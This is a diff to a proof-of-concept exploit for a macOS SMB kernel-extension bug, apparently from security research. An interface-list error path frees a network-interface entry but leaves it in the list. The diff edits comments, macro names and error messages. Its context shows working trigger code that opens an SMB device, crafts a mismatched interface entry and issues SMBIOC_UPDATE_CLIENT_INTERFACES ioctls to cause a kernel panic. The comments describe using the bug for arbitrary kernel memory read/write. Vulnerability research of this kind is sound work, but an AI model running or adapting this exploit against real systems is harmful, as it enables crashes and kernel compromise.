@@ -88,8 +88,8 @@
 ///
 /// The `smb2_mc_add_new_interface_info_to_list` method is responsible for checking if an NIC
 /// with same index is already present in the `client_nic_info_list`. If present, it updates the existing
-/// entry, else a new entry in created and added to the list. The method `smb2_mc_update_info_with_ip`
-/// is called to associate new IP address with the NIC.
+/// NIC entry, else a new NIC entry in created and added to the list. Then it calls the method
+/// `smb2_mc_update_info_with_ip` to associate new IP address with the NIC.
 ///
 /// The method `smb2_mc_add_new_interface_info_to_list` is defined as follows
 ///
@@ -124,8 +124,8 @@
 ///
 ///   error = smb2_mc_update_info_with_ip(nic_info, &new_info->addr, NULL);
 ///
-///   // ***NOTE***: Individual network interface is release when an error occurs but it is not removed from the
-///   //  `struct interface_info_list list`
+///   // ***NOTE***: Individual network interface is released when an error occurs
+///   //                     but it is not removed from the `struct interface_info_list list`
 ///   if (error) {
 ///     SMBERROR("failed to smb2_mc_update_info_with_ip!");
 ///     smb2_mc_release_interface(NULL, nic_info, NULL);
@@ -157,7 +157,7 @@
 /// See POC below which will trigger the vulnerabiltiy and cause a kernel panic
 ///
 /// This vulnerabilty is exploited in `xpl_kmem/smb_dev_rw.c` to obtain read write access to
-/// `struct smb_dev` allocations in kext.48 zone which inturn is used to achieve arbitary kernel
+/// `struct smb_dev` allocations in default.48 zone which inturn is used to achieve arbitary kernel
 /// memory read write.
 ///
 
@@ -188,8 +188,8 @@ int main(int argc, const char * argv[]) {
     bzero(&smb_addr, sizeof(smb_addr));
     smb_addr.sin_family = AF_INET;
     smb_addr.sin_len = sizeof(smb_addr);
-    smb_addr.sin_port = htons(xpl_SMBX_PORT);
-    inet_aton(xpl_SMBX_HOST, &smb_addr.sin_addr);
+    smb_addr.sin_port = htons(XPL_SMBX_PORT);
+    inet_aton(XPL_SMBX_HOST, &smb_addr.sin_addr);
     
     /// Open a new smb device (`/dev/nsmb*`)
     int smb_dev = smb_client_open_dev();
@@ -239,12 +239,12 @@ int main(int argc, const char * argv[]) {
     update_req.total_buffer_size = sizeof(nic_info);
     
     if (ioctl(smb_dev, SMBIOC_UPDATE_CLIENT_INTERFACES, &update_req)) {
-        printf("[ERROR] SMBIOC_UPDATE_CLIENT_INTERFACES failed, err: %s\n", strerror(errno));
+        printf("[ERROR] SMBIOC_UPDATE_CLIENT_INTERFACES ioctl failed, err: %s\n", strerror(errno));
         exit(1);
     }
     
     if (update_req.ioc_errno) {
-        printf("[ERROR] SMBIOC_UPDATE_CLIENT_INTERFACES returned non zero ioc_errno: %d\n", update_req.ioc_errno);
+        printf("[ERROR] SMBIOC_UPDATE_CLIENT_INTERFACES ioctl returned non zero ioc_errno: %d\n", update_req.ioc_errno);
         exit(1);
     }
     
@@ -261,7 +261,8 @@ int main(int argc, const char * argv[]) {
     bad_nic_info.addr_4.sin_len = 0;
     bad_nic_info.addr_4.sin_family = AF_INET;
     bad_nic_info.addr_4.sin_port = htons(1234);
-    /// Use a different IP address so that smb2_mc_does_ip_belong_to_interface will return FALSE
+    /// Use a different IP address so that `smb2_mc_does_ip_belong_to_interface`
+    /// will return FALSE
     inet_aton("127.0.0.2", &bad_nic_info.addr_4.sin_addr);
     
     bzero(&update_req,  sizeof(update_req));
